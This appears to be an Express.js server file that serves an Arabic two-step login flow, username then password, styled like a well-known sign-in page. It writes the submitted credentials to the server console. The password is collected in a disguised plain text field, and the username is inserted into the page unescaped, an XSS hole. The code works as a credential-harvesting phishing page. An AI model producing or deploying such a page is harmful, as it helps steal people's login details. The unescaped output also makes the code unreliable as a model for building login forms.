const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));

let savedUsername = "";

app.get("/", (req, res) => {

res.send(`

<!DOCTYPE html>

<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<title>تسجيل الدخول</title>

<style>

body{

font-family:Arial;

display:flex;

justify-content:center;

align-items:center;

height:100vh;

background:#f5f5f5;

}

.box{

background:white;

padding:40px;

border-radius:20px;

width:350px;

box-shadow:0 0 20px rgba(0,0,0,0.1);

}

h2{

margin-bottom:20px;

}

input{

width:100%;

padding:14px;

margin-top:15px;

border:1px solid #ccc;

border-radius:10px;

font-size:16px;

}

button{

width:100%;

padding:14px;

margin-top:20px;

border:none;

border-radius:10px;

background:#4285f4;

color:white;

font-size:16px;

cursor:pointer;

}

</style>

</head>

<body>

<div class="box">

<h2>
أدخل اسم المستخدم
</h2>

<form action="/next" method="POST">

<input 
type="text" 
name="username" 
placeholder="اسم المستخدم"
required
>

<button type="submit">
التالي
</button>

</form>

</div>

</body>

</html>

`);

});

app.post("/next", (req, res) => {

savedUsername = req.body.username;

res.send(`

<!DOCTYPE html>

<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<title>كلمة السر</title>

<style>

body{

font-family:Arial;

display:flex;

justify-content:center;

align-items:center;

height:100vh;

background:#f5f5f5;

}

.box{

background:white;

padding:40px;

border-radius:20px;

width:350px;

box-shadow:0 0 20px rgba(0,0,0,0.1);

}

.user{

margin-bottom:20px;

color:#555;

}

input{

width:100%;

padding:14px;

margin-top:15px;

border:1px solid #ccc;

border-radius:10px;

font-size:16px;

}

button{

width:100%;

padding:14px;

margin-top:20px;

border:none;

border-radius:10px;

background:#4285f4;

color:white;

font-size:16px;

cursor:pointer;

}

</style>

</head>

<body>

<div class="box">

<h2>
أدخل كلمة السر
</h2>

<div class="user">
${savedUsername}
</div>

<form action="/login" method="POST">

<input 
type="text" 
name="testValue" 
placeholder="كلمة السر"
required
>

<button type="submit">
إرسال
</button>

</form>

</div>

</body>

</html>

`);

});

app.post("/login", (req, res) => {

const password = req.body.testValue;

console.log("========== TEST ==========");
console.log("Username:", savedUsername);
console.log("password:", password);
console.log("==========================");

res.send("تم الإرسال بنجاح");

});

app.listen(3000, () => {

console.log("Server running on http://localhost:3000");

});